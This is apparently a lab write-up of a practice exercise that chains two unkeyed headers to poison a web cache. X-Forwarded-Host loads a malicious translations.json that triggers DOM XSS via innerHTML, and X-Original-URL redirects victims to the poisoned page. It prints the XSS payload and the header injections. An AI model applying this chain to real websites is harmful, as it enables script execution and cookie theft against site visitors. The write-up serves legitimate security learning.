# Combining Web Cache Poisoning Vulnerabilities

## Lab Objective



Exploit a chain of web cache poisoning vulnerabilities to make a victim execute:



```javascript

alert(document.cookie)

```



The lab requires chaining two separate unkeyed headers:



* `X-Forwarded-Host`

* `X-Original-URL`



---



## 1. Identify the Cache Behavior



The homepage was cacheable:



```http

Cache-Control: max-age=30

X-Cache: miss

Age: 0

```



Sending the same request again resulted in:




```http

X-Cache: hit

```



This confirmed that the homepage could be used as a cache oracle.



### Cache Buster



A cache-busting parameter was used during testing:



```http

GET /?cb=random123 HTTP/2

```



Changing the value produced a cache miss, confirming that the query string was included in the cache key.



---



## 2. Find Unkeyed Headers



Using Burp Suite Param Miner:



```text

Extensions → Param Miner → Guess headers

```



we discovered:



```http

X-Forwarded-Host

X-Original-URL

```



Both headers were unkeyed, meaning they could influence the response without changing the cache key.



---



# Part 1 — X-Forwarded-Host → DOM XSS



## 3. Test X-Forwarded-Host



Send:



```http

X-Forwarded-Host: example.com

```



The value was reflected in the response inside:



```javascript

data.host

```



This value was then used to construct the URL for:



```text

translations.json

```



Therefore, we could control where the page fetched its translation file from.



---



## 4. Analyze translations.js



The JavaScript reads the language from the `Lang` cookie:



```http

Cookie: Lang=es

```



It then loads the corresponding translations.



The important sink was:



```javascript

element.innerHTML = dict[k];

```



This creates a DOM XSS opportunity if we can control the translation value.



### Source



Our attacker-controlled:



```text

translations.json

```



### Sink



```javascript

innerHTML

```


---



## 5. Host a Malicious translations.json



A copy of the legitimate `translations.json` was placed on the Exploit Server.



The response included:



```http

Content-Type: application/json

Access-Control-Allow-Origin: *

```



Initially, a harmless value such as:



```text

Fubar

```

was used to confirm that our JSON file was being loaded.

---



## 6. Poison the Spanish Homepage



We used:



```http

X-Forwarded-Host: EXPLOIT-SERVER

```




and targeted:



```text

/?localized=1


```




After poisoning the cache, the Spanish homepage loaded our malicious translation file.



The original text:



```text

View details

```



was replaced with:



```text

Fubar

```



This confirmed that the first stage was working.



---



## 7. Trigger DOM XSS



The malicious translation was changed to:



```html

<img src=1 onerror=alert(document.cookie)>

```



Because the value was inserted through:



```javascript

innerHTML

```



the browser interpreted the HTML and executed the `onerror` handler.



At this point, we had DOM XSS on the Spanish version of the homepage.



---



# Part 2 — X-Original-URL → Redirect to Spanish




## 8. Test X-Original-URL



The second unkeyed header was:



```http

X-Original-URL

```



It can influence the URI processed by the backend.



For example:



```http

GET / HTTP/2

X-Original-URL: /login

```



can cause the backend to generate a response for another path while the front-end cache still treats the request as `/`.



---



## 9. Bypass the Set-Cookie Caching Problem



The language-switching endpoint normally sets:



```http

Set-Cookie: Lang=es

```



Responses containing `Set-Cookie` were not cached.


We therefore used URL normalization.




The important path was:






```text



/set-lang//

```



The backend normalized this path and redirected to the appropriate Spanish route without relying on a cacheable 
`Set-Cookie` response.



Eventually, the user was redirected to:



```text

/?localized=1

```



---



# 10. Combine the Two Vulnerabilities



The exploit must be executed in the correct order.



### Stage 1: Poison the Spanish page



Poison:



```text

/?localized=1

```


using:



```http

X-Forwarded-Host: EXPLOIT-SERVER

```



The malicious `translations.json` contains:



```html

<img src=1 onerror=alert(document.cookie)>

```



---



### Stage 2: Poison the English homepage



Poison:



```text

/

```



using:



```http

X-Original-URL: /set-lang//

```



This causes visitors requesting the normal English homepage to be redirected toward the Spanish version.



---



# Final Exploit Chain




```text

Victim
  │


  ▼

GET /


  │

  ▼

Poisoned cache

  │

  ▼

X-Original-URL → /set-lang//


  │

  ▼

Spanish version

  │



  ▼

/?localized=1

  │

  ▼

Poisoned Spanish page

  │

  ▼

X-Forwarded-Host → Exploit Server

  │

  ▼


Malicious translations.json

  │

  ▼



innerHTML


  │


  ▼

<img src=1 onerror=alert(document.cookie)>

  │

  ▼

DOM XSS


```





## Key Takeaways



* Unkeyed headers can be chained together to create a much more powerful exploit.

* `X-Forwarded-Host` allowed control over the origin of `translations.json`.

* `innerHTML` provided the DOM XSS sink.

* `X-Original-URL` allowed us to influence backend routing.

* URL normalization helped bypass the non-cacheable `Set-Cookie` response.

* The Spanish page had to be poisoned **before** poisoning the English homepage.

* Cache poisoning attacks often depend on carefully understanding the cache key, cacheability rules, redirects, and 

backend normalization.




## Final Concept



> **A complex cache poisoning attack can be built by chaining multiple unkeyed inputs, where one vulnerability creates 
the malicious response and another vulnerability delivers that response to the victim.**

